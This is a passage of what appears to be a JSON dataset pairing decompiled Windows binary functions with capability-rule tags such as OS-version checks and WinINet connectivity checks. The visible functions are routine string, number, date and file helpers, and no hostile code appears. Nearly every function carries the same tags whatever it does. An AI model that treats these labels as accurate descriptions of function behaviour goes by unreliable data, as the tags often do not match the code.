         }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 653
    },
    "0040675c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040675c(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if ((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 848
    },
    "0040780c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040780c(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x4078bc, 0x4078a8);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x4078c4);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4078d4);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4078ec);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 343
    },
    "00407904": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00407904(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x40793f;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x4957fc = *0x4957fc + 1;\n    if ((*0x4957fc == 0) && (*0x495800 != 0)) {\n        iStack20 = *0x495800;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 172
    },
    "00408ec4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00408ec4(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.004038e0();\n    if (iStack20 != 0) {\n        fcn.0040883c();\n    }\n    return uVar1;\n}\n",
        "token_count": 69
    },
    "00408f00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00408f00(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004038e0();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 79
    },
    "00408f18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00408f18(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.004038e0();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 84
    },
    "00409218": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409218(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.00405264(*((param_2 & 3) * 4 + 0x490850), *(((param_2 & 0xf0) >> 4) * 4 + 0x49085c), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 168
    },
    "0040954c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0040954c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.00405264(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 64
    },
    "00409800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409800(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040cf78();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.00409594();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.0040883c();\n    return;\n}\n",
        "token_count": 167
    },
    "00409858": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00409858(void)\n\n{\n    if (**0x492cc0 != NULL) {\n        (***0x492cc0)();\n        return;\n    }\n    fcn.00402e34();\n    return;\n}\n",
        "token_count": 50
    },
    "00409888": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409957)\n\nvoid __cdecl fcn.00409888(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x004098b1:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x004098db;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x00409bef:\n    fcn.00409bdf();\n    return;\ncode_r0x004098db:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x00409bef;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.0040996a(unaff_EDI, unaff_ESI);\n    pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x004098fa;\n    if (in_ECX == extraout_ECX) goto code_r0x00409bef;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x004098db;\ncode_r0x004098fa:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x00409bef;\n        in_ECX = in_ECX + 1;\n        fcn.0040996a(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.004099b2(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x004098b1;\n}\n",
        "token_count": 1177
    },
    "0040996a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040996a(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x00409bef:\n            fcn.00409bdf();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x00409bef;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "00409db4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00409db4(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.0040a088(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.00409eb3();\n        puVar4 = extraout_ECX * 3 + 0x409ea4;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x409e90))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 445
    },
    "00409eb3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00409eb3(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0040a088": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a088(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.0040a0b5(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.0040a1d7(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0040a0b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0b5(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x0040a0e0:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00403a3c();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x490878);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x490884);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 = 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x0040a0e0;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = *(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x0040a1a2;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x0040a1a2:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x0040a1b5;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x0040a1b5:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x0040a1b8;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x0040a0e0;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040a1b8:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1199
    },
    "0040a2b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a2b4(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x49580b;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.0040a36b();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.0040a376();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.0040a376();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.0040a392(iVar4);\n        }\n        fcn.0040a36b();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00403a3c();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 537
    },
    "0040a604": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuchar __cdecl fcn.0040a604(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t in_CX;\n    int32_t iVar4;\n    uint16_t in_DX;\n    int32_t iVar5;\n    uint var_8h;\n    uchar var_3h;\n    uint var_2h;\n    \n    var_3h = 0;\n    uVar2 = fcn.0040a5c8();\n    iVar5 = (uVar2 & 0x7f) * 0x18;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) && (puVar1 = iVar5 + 0x4907ea + in_DX * 2,  in_CX < *puVar1 || in_CX == *puVar1))\n       )) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar4 = 1;\n            do {\n                in_CX = in_CX + *(iVar5 + 0x4907ea + iVar4 * 2);\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar5 = iVar3;\n        if (iVar3 < 0) {\n            iVar5 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar5 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_3h = 1;\n    }\n    return var_3h;\n}\n",
        "token_count": 443
    },
    "0040a950": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a950(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.0040a81c(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0040a988": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a988(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.0040a56c(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0040ac5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ac5c(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1eh;\n    int16_t var_1ah;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x40b3e0;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        var_1eh._0_1_ = 0x20;\n        var_4h = in_EAX;\n        while (*var_4h != 0) {\n            uVar1 = *var_4h;\n            if ((*((uVar1 >> 3) + 0x49081c) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040d1c0();\n                uVar6 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar6 = uVar1 - 0x20;\n                }\n                uVar3 = var_1eh;\n                if (((uVar6 + 0xbf < 0x1a) && (uVar3 = uVar6,  uVar6 == 0x4d)) && (var_1eh == 0x48)) {\n                    uVar6 = 0x4e;\n                    uVar3 = uVar6;\n                }\n                var_1eh._0_1_ = uVar3;\n    // switch table (57 cases) at 0x40ad7d\n                switch(uVar6) {\n                case 0x22:\n                case 0x27:\n                    while ((*var_4h != 0 && (*var_4h != uVar1))) {\n                        if ((*((*var_4h >> 3) + 0x49081c) >> (*var_4h & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040d1c0();\n                        }\n                    }\n                    fcn.0040a878(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.0040a878(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x49580d != '\\0') {\n                        fcn.0040a878(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x495818 != '\\0') {\n                        fcn.0040a878(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.0040a988(&stack0xfffffffc);\n                    iVar5 = fcn.004096e4();\n                    if (iVar5 == 0) {\n                        fcn.0040a878(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar5 = fcn.004096e4();\n                        